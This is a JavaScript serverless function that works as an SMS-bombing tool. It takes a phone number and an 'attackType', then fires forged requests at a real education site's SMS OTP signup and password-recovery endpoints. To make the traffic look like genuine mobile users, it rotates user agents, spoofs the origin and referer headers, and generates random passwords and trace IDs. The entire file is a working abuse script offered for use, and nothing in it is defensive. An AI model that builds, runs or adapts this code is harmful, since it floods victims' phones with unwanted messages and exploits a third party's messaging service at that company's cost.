const https = require('https');

const USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36"
];

function generatePassword() {
    const upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    const lower = "abcdefghijklmnopqrstuvwxyz";
    const digits = "0123456789";
    const length = Math.floor(Math.random() * 4) + 7;
    const chars = upper + lower + digits;
    let password = [
        upper[Math.floor(Math.random() * upper.length)],
        lower[Math.floor(Math.random() * lower.length)],
        digits[Math.floor(Math.random() * digits.length)]
    ];
    for (let i = 0; i < length - 3; i++) {
        password.push(chars[Math.floor(Math.random() * chars.length)]);
    }
    password.sort(() => Math.random() - 0.5);
    return password.join('');
}

function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
        const r = Math.random() * 16 | 0;
        const v = c === 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
    });
}

function makeRequest(url, phone, attackType) {
    return new Promise((resolve) => {
        const userAgent = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
        
        let payload;
        if (attackType === 1) {
            payload = {
                language: 'ar',
                password: generatePassword(),
                country: 'EG',
                sms_otp_phone: phone,
                platform: 'web',
                data: { Language: 'ar' },
                channel: 'sms'
            };
        } else {
            payload = {
                language: 'ar',
                sms_otp_phone: phone,
                country_code: 'EG',
                country: 'EG'
            };
        }

        const postData = JSON.stringify(payload);
        const urlObj = new URL(url);

        const options = {
            hostname: urlObj.hostname,
            path: urlObj.pathname,
            method: 'POST',
            headers: {
                'authority': 'gw.abgateway.com',
                'accept': 'application/json',
                'accept-language': 'en-GB,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,en-US;q=0.6',
                'content-type': 'application/json',
                'origin': 'https://abwaab.com',
                'platform': 'web',
                'referer': 'https://abwaab.com/',
                'user-agent': userAgent,
                'x-trace-id': 'guest_user:' + generateUUID(),
                'Content-Length': Buffer.byteLength(postData)
            }
        };

        const req = https.request(options, (res) => {
            if (res.statusCode >= 200 && res.statusCode < 300) {
                resolve('ok');
            } else if (res.statusCode === 406) {
                resolve('406');
            } else {
                resolve('other');
            }
        });

        req.on('error', () => resolve('other'));
        req.write(postData);
        req.end();
    });
}

module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-API-Key');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const apiKey = req.headers['x-api-key'];
    if (!apiKey || apiKey !== process.env.API_KEY) {
        return res.status(401).json({ error: 'Unauthorized' });
    }

    const { phone, attackType } = req.body;

    if (!phone || !attackType) {
        return res.status(400).json({ error: 'Missing parameters' });
    }

    const url = attackType === 1 
        ? "https://gw.abgateway.com/student/sms-otp/signup"
        : "https://gw.abgateway.com/student/sms-otp/recovery-password";

    try {
        const result = await makeRequest(url, phone, attackType);
        res.status(200).json({ result });
    } catch (error) {
        res.status(500).json({ error: 'Internal server error' });
    }
};
